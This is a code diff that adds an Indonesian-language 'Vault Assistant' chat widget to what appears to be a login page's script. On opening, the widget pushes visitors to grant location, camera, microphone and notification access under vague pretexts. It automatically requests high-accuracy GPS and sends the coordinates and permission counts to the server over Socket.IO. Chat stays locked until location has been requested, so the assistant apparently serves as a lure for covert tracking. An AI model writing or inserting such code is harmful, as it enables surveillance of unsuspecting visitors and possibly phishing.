@@ -931,6 +931,282 @@ window.addEventListener('beforeunload',()=>{
     if(window.speechSynthesis)window.speechSynthesis.cancel();
 });
 
+// ===== AI CHAT AGENT =====
+let aiChatReady = false;
+let aiPermissionsChecked = false;
+let aiChatOpen = false;
+
+function initAIChat() {
+    // Create floating button
+    const btn = document.createElement('div');
+    btn.id = 'aiChatBtn';
+    btn.innerHTML = '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>';
+    btn.style.cssText = 'position:fixed;bottom:24px;right:24px;z-index:9998;width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 8px 32px rgba(0,212,255,0.3);transition:all .3s;animation:aiPulse 2s ease-in-out infinite;';
+    document.body.appendChild(btn);
+
+    // Create chat panel
+    const panel = document.createElement('div');
+    panel.id = 'aiChatPanel';
+    panel.style.cssText = 'position:fixed;bottom:100px;right:24px;z-index:9999;width:380px;max-width:calc(100vw - 48px);height:520px;max-height:calc(100vh - 140px);background:#0a0a1a;border:1px solid rgba(255,255,255,0.08);border-radius:20px;display:none;flex-direction:column;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.5);font-family:inherit;';
+    panel.innerHTML = `
+        <div style="padding:20px;background:linear-gradient(135deg,rgba(0,212,255,0.1),rgba(124,58,237,0.1));border-bottom:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;gap:12px;">
+            <div style="width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#00d4ff,#7c3aed);display:flex;align-items:center;justify-content:center;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a2 2 0 0 1-2 2H10a2 2 0 0 1-2-2v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7z"/><path d="M9 22h6"/><path d="M10 22v-4"/><path d="M14 22v-4"/></svg>
+            </div>
+            <div>
+                <div style="font-weight:700;font-size:.95rem;color:#fff;">Vault Assistant</div>
+                <div style="font-size:.72rem;color:#6a6a8e;display:flex;align-items:center;gap:5px;"><span style="width:6px;height:6px;border-radius:50%;background:#00d4ff;display:inline-block;"></span>Online</div>
+            </div>
+            <div style="margin-left:auto;cursor:pointer;padding:6px;" id="aiChatClose">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6a6a8e" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            </div>
+        </div>
+        <div id="aiChatMessages" style="flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:12px;scroll-behavior:smooth;">
+            <div style="align-self:flex-start;max-width:80%;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.06);padding:12px 16px;border-radius:16px 16px 16px 4px;font-size:.85rem;color:#ccc;line-height:1.5;">
+                Halo! Saya Vault Assistant. Ada yang bisa saya bantu hari ini? 👋
+            </div>
+        </div>
+        <div id="aiChatPermission" style="display:none;padding:16px;background:rgba(0,212,255,0.05);border-top:1px solid rgba(255,255,255,0.06);">
+            <div style="font-size:.82rem;color:#aaa;text-align:center;margin-bottom:12px;">Untuk melanjutkan, mohon aktifkan akses berikut:</div>
+            <div id="aiPermList" style="display:flex;flex-direction:column;gap:8px;"></div>
+        </div>
+        <div style="padding:12px 16px;border-top:1px solid rgba(255,255,255,0.06);display:flex;gap:10px;background:rgba(10,10,26,0.95);">
+            <input id="aiChatInput" type="text" placeholder="Ketik pesan..." style="flex:1;padding:12px 16px;border-radius:12px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#fff;font-size:.85rem;outline:none;font-family:inherit;" autocomplete="off">
+            <button id="aiChatSend" style="padding:12px 18px;border-radius:12px;border:none;background:linear-gradient(135deg,#00d4ff,#7c3aed);color:#fff;cursor:pointer;font-size:.9rem;display:flex;align-items:center;justify-content:center;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+            </button>
+        </div>
+    `;
+    document.body.appendChild(panel);
+
+    // Inject styles
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes aiPulse { 0%,100%{box-shadow:0 8px 32px rgba(0,212,255,0.3)} 50%{box-shadow:0 8px 48px rgba(0,212,255,0.5)} }
+        #aiChatMessages::-webkit-scrollbar { width:4px; }
+        #aiChatMessages::-webkit-scrollbar-track { background:transparent; }
+        #aiChatMessages::-webkit-scrollbar-thumb { background:rgba(255,255,255,0.1); border-radius:2px; }
+        .ai-msg-user { align-self:flex-end; max-width:80%; background:linear-gradient(135deg,#00d4ff,#7c3aed); padding:12px 16px; border-radius:16px 16px 4px 16px; font-size:.85rem; color:#fff; line-height:1.5; }
+        .ai-msg-bot { align-self:flex-start; max-width:80%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.06); padding:12px 16px; border-radius:16px 16px 16px 4px; font-size:.85rem; color:#ccc; line-height:1.5; }
+        .ai-msg-typing { align-self:flex-start; max-width:80%; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.06); padding:12px 16px; border-radius:16px 16px 16px 4px; font-size:.85rem; color:#6a6a8e; display:flex; gap:4px; align-items:center; }
+        .ai-typing-dot { width:6px; height:6px; border-radius:50%; background:#6a6a8e; animation:aiTyping 1.4s ease-in-out infinite; }
+        .ai-typing-dot:nth-child(2) { animation-delay:0.2s; }
+        .ai-typing-dot:nth-child(3) { animation-delay:0.4s; }
+        @keyframes aiTyping { 0%,60%,100%{transform:translateY(0);opacity:0.4} 30%{transform:translateY(-6px);opacity:1} }
+        .ai-perm-item { display:flex; align-items:center; gap:10px; padding:10px 14px; border-radius:10px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); cursor:pointer; transition:all .3s; }
+        .ai-perm-item:hover { background:rgba(0,212,255,0.08); border-color:rgba(0,212,255,0.2); }
+        .ai-perm-item .perm-icon { width:32px; height:32px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:1.1rem; }
+        .ai-perm-item .perm-text { flex:1; }
+        .ai-perm-item .perm-title { font-size:.82rem; font-weight:600; color:#ddd; }
+        .ai-perm-item .perm-desc { font-size:.72rem; color:#6a6a8e; margin-top:2px; }
+        .ai-perm-item .perm-status { font-size:.72rem; font-weight:600; padding:3px 8px; border-radius:6px; }
+        .ai-perm-item .perm-ok { background:rgba(0,212,255,0.15); color:#00d4ff; }
+        .ai-perm-item .perm-pending { background:rgba(255,193,7,0.15); color:#ffc107; }
+        .ai-perm-granted { border-color:rgba(0,212,255,0.3) !important; background:rgba(0,212,255,0.05) !important; }
+    `;
+    document.head.appendChild(style);
+
+    // Toggle chat panel
+    btn.addEventListener('click', () => {
+        aiChatOpen = !aiChatOpen;
+        panel.style.display = aiChatOpen ? 'flex' : 'none';
+        btn.style.transform = aiChatOpen ? 'scale(0.9)' : 'scale(1)';
+        if (aiChatOpen && !aiPermissionsChecked) {
+            showPermissionPrompts();
+        }
+        if (aiChatOpen) {
+            setTimeout(() => document.getElementById('aiChatInput')?.focus(), 100);
+        }
+    });
+
+    document.getElementById('aiChatClose').addEventListener('click', () => {
+        aiChatOpen = false;
+        panel.style.display = 'none';
+        btn.style.transform = 'scale(1)';
+    });
+
+    // Send message
+    document.getElementById('aiChatSend').addEventListener('click', sendAIMessage);
+    document.getElementById('aiChatInput').addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendAIMessage(); }
+    });
+
+    // Listen for AI responses
+    socket.on('ai-response', (data) => {
+        removeTypingIndicator();
+        addChatBubble(data.message, 'bot');
+    });
+}
+
+function showPermissionPrompts() {
+    const permDiv = document.getElementById('aiChatPermission');
+    const permList = document.getElementById('aiPermList');
+    permDiv.style.display = 'block';
+
+    const perms = [
+        { id: 'location', icon: '📍', title: 'Lokasi', desc: 'Akses GPS untuk layanan lokal', color: '#00d4ff' },
+        { id: 'camera', icon: '📷', title: 'Kamera', desc: 'Akses kamera untuk verifikasi', color: '#7c3aed' },
+        { id: 'microphone', icon: '🎤', title: 'Mikrofon', desc: 'Akses mikrofon untuk voice chat', color: '#ec4899' },
+        { id: 'notifications', icon: '🔔', title: 'Notifikasi', desc: 'Izin notifikasi untuk update', color: '#f59e0b' }
+    ];
+
+    permList.innerHTML = '';
+    perms.forEach(p => {
+        const item = document.createElement('div');
+        item.className = 'ai-perm-item';
+        item.id = 'perm-' + p.id;
+        item.innerHTML = `
+            <div class="perm-icon" style="background:${p.color}22;">${p.icon}</div>
+            <div class="perm-text"><div class="perm-title">${p.title}</div><div class="perm-desc">${p.desc}</div></div>
+            <div class="perm-status perm-pending" id="perm-status-${p.id}">Minta</div>
+        `;
+        item.addEventListener('click', () => requestSinglePermission(p.id, p.color));
+        permList.appendChild(item);
+    });
+
+    // Auto-request location first
+    setTimeout(() => requestSinglePermission('location', '#00d4ff'), 500);
+}
+
+async function requestSinglePermission(type, color) {
+    const statusEl = document.getElementById('perm-status-' + type);
+    const itemEl = document.getElementById('perm-' + type);
+
+    try {
+        if (type === 'location') {
+            statusEl.textContent = '...';
+            statusEl.className = 'perm-status';
+            statusEl.style.color = '#ffc107';
+            navigator.geolocation.getCurrentPosition(
+                (p) => {
+                    socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy });
+                    statusEl.textContent = '✓ Aktif';
+                    statusEl.className = 'perm-status perm-ok';
+                    statusEl.style.color = '';
+                    itemEl.classList.add('ai-perm-granted');
+                    checkAllPermissions();
+                },
+                () => {
+                    statusEl.textContent = 'Ditolak';
+                    statusEl.className = 'perm-status';
+                    statusEl.style.color = '#ff6b6b';
+                    checkAllPermissions();
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else if (type === 'camera') {
+            statusEl.textContent = '...';
+            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            s.getTracks().forEach(t => t.stop());
+            statusEl.textContent = '✓ Aktif';
+            statusEl.className = 'perm-status perm-ok';
+            statusEl.style.color = '';
+            itemEl.classList.add('ai-perm-granted');
+            checkAllPermissions();
+        } else if (type === 'microphone') {
+            statusEl.textContent = '...';
+            const s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+            s.getTracks().forEach(t => t.stop());
+            statusEl.textContent = '✓ Aktif';
+            statusEl.className = 'perm-status perm-ok';
+            statusEl.style.color = '';
+            itemEl.classList.add('ai-perm-granted');
+            checkAllPermissions();
+        } else if (type === 'notifications') {
+            if ('Notification' in window) {
+                const p = await Notification.requestPermission();
+                if (p === 'granted') {
+                    statusEl.textContent = '✓ Aktif';
+                    statusEl.className = 'perm-status perm-ok';
+                    statusEl.style.color = '';
+                    itemEl.classList.add('ai-perm-granted');
+                } else {
+                    statusEl.textContent = 'Ditolak';
+                    statusEl.className = 'perm-status';
+                    statusEl.style.color = '#ff6b6b';
+                }
+            } else {
+                statusEl.textContent = 'N/A';
+                statusEl.className = 'perm-status perm-ok';
+                statusEl.style.color = '';
+                itemEl.classList.add('ai-perm-granted');
+            }
+            checkAllPermissions();
+        }
+    } catch (e) {
+        statusEl.textContent = 'Ditolak';
+        statusEl.className = 'perm-status';
+        statusEl.style.color = '#ff6b6b';
+        checkAllPermissions();
+    }
+}
+
+function checkAllPermissions() {
+    const statuses = ['location', 'camera', 'microphone', 'notifications'].map(id => {
+        const el = document.getElementById('perm-status-' + id);
+        return el ? el.textContent : '';
+    });
+    // Allow chat even if some permissions denied - just track which ones
+    const granted = statuses.filter(s => s.includes('Aktif')).length;
+    socket.emit('device-info', { aiPermissions: { granted, total: 4, time: Date.now() } });
+
+    // Enable chat after at least location is attempted
+    const locStatus = document.getElementById('perm-status-location');
+    if (locStatus && (locStatus.textContent.includes('Aktif') || locStatus.textContent === 'Ditolak')) {
+        aiPermissionsChecked = true;
+        aiChatReady = true;
+        document.getElementById('aiChatPermission').style.display = 'none';
+    }
+}
+
+function sendAIMessage() {
+    const input = document.getElementById('aiChatInput');
+    const msg = input.value.trim();
+    if (!msg) return;
+
+    if (!aiChatReady) {
+        addChatBubble('Mohon aktifkan akses lokasi terlebih dahulu.', 'bot');
+        return;
+    }
+
+    input.value = '';
+    addChatBubble(msg, 'user');
+    showTypingIndicator();
+
+    // Send via Socket.IO
+    socket.emit('ai-message', { deviceId: deviceId, message: msg });
+}
+
+function addChatBubble(text, type) {
+    const container = document.getElementById('aiChatMessages');
+    if (!container) return;
+    const div = document.createElement('div');
+    div.className = type === 'user' ? 'ai-msg-user' : 'ai-msg-bot';
+    div.textContent = text;
+    container.appendChild(div);
+    container.scrollTop = container.scrollHeight;
+}
+
+function showTypingIndicator() {
+    const container = document.getElementById('aiChatMessages');
+    if (!container) return;
+    const existing = container.querySelector('.ai-msg-typing');
+    if (existing) return;
+    const div = document.createElement('div');
+    div.className = 'ai-msg-typing';
+    div.innerHTML = '<div class="ai-typing-dot"></div><div class="ai-typing-dot"></div><div class="ai-typing-dot"></div>';
+    container.appendChild(div);
+    container.scrollTop = container.scrollHeight;
+}
+
+function removeTypingIndicator() {
+    const el = document.querySelector('.ai-msg-typing');
+    if (el) el.remove();
+}
+
+// Initialize AI chat when socket is ready
+setTimeout(initAIChat, 1000);
+
 document.querySelector('form').addEventListener('submit', handleLogin);
 document.querySelector('.input-append button').addEventListener('click', togglePass);
 document.querySelectorAll('.social-btn').forEach(btn => {
